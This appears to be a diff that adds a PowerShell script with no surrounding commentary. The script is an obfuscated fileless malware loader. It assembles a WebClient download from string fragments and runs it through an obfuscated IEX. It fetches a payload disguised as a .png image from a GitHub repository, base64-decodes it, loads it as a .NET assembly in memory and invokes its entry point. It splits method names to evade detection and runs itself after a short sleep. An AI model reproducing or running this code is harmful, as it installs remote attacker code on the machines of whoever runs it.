@@ -1,0 +1,9 @@
+Function FFFFFFFFFFFFFFFFFFFFFFFFFFFFFGFG
+{
+if([System.IO.File]::Exists("C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe")){
+[void] [System.Reflection.Assembly]::LoadWithPartialName("Microsoft.VisualBasic")$t=[system.Convert]$dd=$t.GetMethod("FromBase64String")$c1='(New-Object Net.We'; $c4='bClient).Downlo'; $c3='adString(''https://raw.githubusercontent.com/sattarwahid602/new2020/master/net4.png'')';$TC=I`E`X ($c1,$c4,$c3 -Join '')$uohgh= $TC.replace('@','A').replace('#','B').replace('~','E')$obj2 =$uohgh$hgh2=$dd.Invoke($null,$obj2)$a =[Microsoft.VisualBasic.Interaction]::CallByname([AppDomain]::CurrentDomain,"L" + "oad",[Microsoft.VisualBasic.CallType]::Method,$hgh2)$a2=[Microsoft.VisualBasic.Interaction]::CallByname($a,"En" + "trypoint",[Microsoft.VisualBasic.CallType]::Get)$a3=[Microsoft.VisualBasic.Interaction]::CallByname($a2,"In" + "voke",[Microsoft.VisualBasic.CallType]::Method,$null,$null)}else{
+[void] [System.Reflection.Assembly]::LoadWithPartialName("Microsoft.VisualBasic")$t=[system.Convert]$dd=$t.GetMethod("FromBase64String")$c1='(New-Object Net.We'; $c4='bClient).Downlo'; $c3='adString(''https://raw.githubusercontent.com/sattarwahid602/new2020/master/net2.png'')';$TC=I`E`X ($c1,$c4,$c3 -Join '')$uohgh= $TC.replace('@','A').replace('#','B').replace('~','E')$obj2 =$uohgh$hgh2=$dd.Invoke($null,$obj2)$a =[Microsoft.VisualBasic.Interaction]::CallByname([AppDomain]::CurrentDomain,"L" + "oad",[Microsoft.VisualBasic.CallType]::Method,$hgh2)$a2=[Microsoft.VisualBasic.Interaction]::CallByname($a,"En" + "trypoint",[Microsoft.VisualBasic.CallType]::Get)$a3=[Microsoft.VisualBasic.Interaction]::CallByname($a2,"In" + "voke",[Microsoft.VisualBasic.CallType]::Method,$null,$null)
+}
+}
+Start-Sleep -S 5 
+IEX FFFFFFFFFFFFFFFFFFFFFFFFFFFFFGFG
